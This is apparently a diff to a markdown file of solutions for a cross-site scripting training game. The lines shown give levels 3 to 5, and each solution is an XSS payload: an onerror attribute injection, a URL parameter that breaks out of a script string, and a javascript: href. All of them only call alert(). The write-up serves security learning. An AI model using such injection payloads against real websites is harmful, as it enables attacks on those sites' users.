@@ -12,3 +12,6 @@ _Solution_: add to url the code: `#1' onerror='alert("xss")'`
 
 ## [4/6]  Level 4: Context matters
 _Solution_: put this url: `http://xss-game.appspot.com/level4/frame?timer=3')%3Balert('xss`
+
+## [5/6]  Level 5: Breaking protocol
+_Solution_: change the href link with: `javascript:alert('xss');` 
